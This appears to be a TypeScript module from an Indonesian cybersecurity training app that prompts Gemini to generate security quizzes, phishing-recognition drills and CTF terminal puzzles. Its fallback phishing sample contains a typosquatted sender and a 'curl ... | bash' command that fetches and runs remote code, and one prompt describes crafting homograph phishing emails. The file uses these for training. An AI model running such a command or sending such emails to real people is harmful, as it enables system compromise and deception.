import { GoogleGenAI, Type } from "@google/genai";
import { QuizQuestion, PhishingEmail, TerminalScenario } from "../types";

// Initialize Gemini
const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });

const MODEL_NAME = 'gemini-2.5-flash';

export const generateQuizQuestion = async (difficulty: string): Promise<QuizQuestion> => {
  try {
    // Difficulty Calibration: INSANE TIER
    let difficultyPrompt = "";
    if (difficulty === 'Easy') {
      difficultyPrompt = "Level: Intermediate (CompTIA Security+). Fokus pada konsep networking dan ports.";
    } else if (difficulty === 'Medium') {
      difficultyPrompt = "Level: Advanced (CEH/CySA+). Fokus pada analisis log, syntax nmap, dan SQL Injection types.";
    } else {
      difficultyPrompt = "Level: ELITE RESEARCHER (OSCP/OSEP/CISSP). Pertanyaan harus SANGAT SUSAH & SPESIFIK. Topik: Advanced Heap Exploitation (Use-After-Free), Kernel ROP Chains, x64 Assembly Gadgets, Deserialization Gadget Chains, atau Cryptographic Side-Channel Attacks. JANGAN tanya definisi. Tanya output kode atau impact spesifik dari CVE terkenal.";
    }
    
    const response = await ai.models.generateContent({
      model: MODEL_NAME,
      contents: `Buatkan satu pertanyaan kuis pilihan ganda tentang Cyber Security dalam Bahasa Indonesia.
                 ${difficultyPrompt}
                 
                 Format output JSON.
                 Pastikan pengecoh (opsi yang salah) sangat masuk akal secara teknis.`,
      config: {
        responseMimeType: "application/json",
        responseSchema: {
          type: Type.OBJECT,
          properties: {
            question: { type: Type.STRING },
            options: { 
              type: Type.ARRAY, 
              items: { type: Type.STRING },
              description: "Array berisi tepat 4 pilihan jawaban"
            },
            correctIndex: { type: Type.INTEGER },
            explanation: { type: Type.STRING },
            difficulty: { type: Type.STRING }
          },
          required: ["question", "options", "correctIndex", "explanation", "difficulty"]
        }
      }
    });

    const data = JSON.parse(response.text || "{}");
    return data as QuizQuestion;
  } catch (error) {
    console.error("Error generating quiz:", error);
    return {
      question: "Dalam eksploitasi Heap pada Glibc modern, teknik 'Fastbin Dup' mengandalkan mekanisme apa untuk memanipulasi pointer?",
      options: ["Double Free check bypass pada chunk size yang sama", "Unlink macro corruption", "Top Chunk expansion", "Tcache bin poisoning tanpa locking"],
      correctIndex: 0,
      explanation: "Fastbin Dup memanfaatkan kondisi Double Free. Jika attacker bisa membebaskan chunk yang sama dua kali (dengan satu chunk lain di antaranya untuk bypass check sederhana), pointer bin akan menunjuk ke lokasi yang sama, memungkinkan alokasi memori arbitrer.",
      difficulty: "Hard"
    };
  }
};

export const generatePhishingScenario = async (): Promise<PhishingEmail> => {
  try {
    const response = await ai.models.generateContent({
      model: MODEL_NAME,
      contents: `Generate a 'RED TEAM' LEVEL Phishing or Legit email task (Bahasa Indonesia).
                 
                 Target: Senior Security Engineer.
                 Difficulty: EXTREME.
                 
                 If Phishing:
                 1. Use 'Punnycode' / IDN Homograph attacks that are almost invisible.
                 2. Mimic a 'Bug Bounty' platform report (HackerOne/Bugcrowd) or a 'GitGuardian' alert.
                 3. The payload should be a subtle 'command' in a copy-paste snippet, not just a link.
                 
                 If Legit:
                 Make it look like a terrifying false positive. E.g. A weirdly formatted 2FA request from a real service that looks like an attack but analyzes true via headers.
                 
                 Objective: Test the user's paranoia vs technical verification.`,
      config: {
        responseMimeType: "application/json",
        responseSchema: {
          type: Type.OBJECT,
          properties: {
            sender: { type: Type.STRING },
            subject: { type: Type.STRING },
            body: { type: Type.STRING },
            isPhishing: { type: Type.BOOLEAN },
            clues: { type: Type.ARRAY, items: { type: Type.STRING } },
            explanation: { type: Type.STRING }
          },
          required: ["sender", "subject", "body", "isPhishing", "clues", "explanation"]
        }
      }
    });
    
    const data = JSON.parse(response.text || "{}");
    return data as PhishingEmail;
  } catch (error) {
    console.error("Error generating phishing:", error);
    return {
      sender: "security@hacker0ne-support.com",
      subject: "Critical Vulnerability Report #9921: RCE on Production",
      body: "A researcher has submitted a P1 vulnerability. Please verify the PoC immediately:\n\ncurl -v https://api-internal-check.io/v1/validate | bash\n\nView full report: https://hackerone.com/reports/9921",
      isPhishing: true,
      clues: ["Domain sender 'hacker0ne-support.com' adalah typosquatting (angka 0)", "Teknik 'Pipe to Bash' sangat berbahaya"],
      explanation: "Email ini menggunakan social engineering dengan urgensi tinggi (P1 Vulnerability) dan domain spoofing yang sangat mirip. Perintah curl | bash adalah red flag utama."
    };
  }
};

export const generateTerminalChallenge = async (level: number): Promise<TerminalScenario> => {
  try {
    let difficultyInstruction = "";
    let fileStructureInstruction = "";
    
    if (level >= 4 && level <= 20) {
      // Beginner/Intermediate
      difficultyInstruction = "Level: Intermediate. Flag dienkripsi (Base64/Hex) atau disembunyikan di log panjang.";
      fileStructureInstruction = "Buat file 'auth.log' dengan banyak entri sampah.";
    } 
    else if (level > 20 && level <= 50) {
      // Hard - Crypto
      difficultyInstruction = "Level: HARD. Flag di-reverse (terbalik) atau di-encode ganda (Base64 of Hex). Hint harus menyarankan tool 'rev' atau decode berulang.";
      fileStructureInstruction = "File bernama 'secret.enc'.";
    } 
    else if (level > 50 && level <= 75) {
      // Expert - Forensics (strings)
      difficultyInstruction = "Level: FORENSICS. Simulasikan file BINARY atau MEMORY DUMP. Konten file harus terlihat seperti sampah karakter (mojibake/symbols). Flag 'CTF{...}' terselip di antaranya. User WAJIB pakai command 'strings'.";
      fileStructureInstruction = "File 'process.dmp' isinya karakter acak + flag.";
    } 
    else if (level > 75 && level <= 90) {
      // Elite - Reverse Engineering
      difficultyInstruction = "Level: REVERSE ENGINEERING. Isi file adalah SOUCE CODE (C atau Python) atau Pseudo-Assembly. Flag TIDAK DITULIS. Flag adalah INPUT yang membuat program print 'Access Granted'. Contoh: if(input == 0xDEADBEEF)... User harus menghitung manual.";
      fileStructureInstruction = "File 'login_logic.c' atau 'check_pass.py'.";
    } 
    else if (level > 90) {
      // God Mode - Abstract
      difficultyInstruction = "Level: SINGULARITY. Pattern recognition ekstrem. File berisi deretan angka binary atau hex yang jika di-convert ke ASCII membentuk kalimat filosofis atau Flag.";
      fileStructureInstruction = "File 'signal_from_void.dat'.";
    }

    const response = await ai.models.generateContent({
      model: MODEL_NAME,
      contents: `Generate a HARDCORE Cyber Security Terminal CTF Puzzle for Level ${level}.
                 
                 DIFFICULTY: ${difficultyInstruction}
                 FILE STRUCTURE: ${fileStructureInstruction}
                 
                 Language: Bahasa Indonesia for Title/Desc. English for File Content.
                 
                 REQUIREMENTS:
                 1. Solution MUST be exact flag.
                 2. For Forensics levels, make file content look messy so 'cat' is useless but 'strings' works.
                 3. For Reverse Engineering, the file content is the puzzle itself.
                 
                 Output JSON Only.`,
      config: {
        responseMimeType: "application/json",
        responseSchema: {
          type: Type.OBJECT,
          properties: {
            id: { type: Type.INTEGER },
            title: { type: Type.STRING },
            description: { type: Type.STRING },
            systemMessage: { type: Type.ARRAY, items: { type: Type.STRING } },
            fileSystem: { 
              type: Type.OBJECT, 
              description: "Map of filename to content.",
            },
            solution: { type: Type.STRING },
            hint: { type: Type.STRING }
          },
          required: ["title", "description", "fileSystem", "solution", "hint"]
        }
      }
    });

    const data = JSON.parse(response.text || "{}");
    return { ...data, id: level, isInteractive: false };
  } catch (error) {
    console.error("Error generating terminal level:", error);
    return {
      id: level,
      title: "SYSTEM OFFLINE",
      description: "AI Communication Severed.",
      systemMessage: ["Reconnecting..."],
      fileSystem: { "error.log": "Connection timeout." },
      solution: "retry",
      hint: "Try again.",
      isInteractive: false
    };
  }
};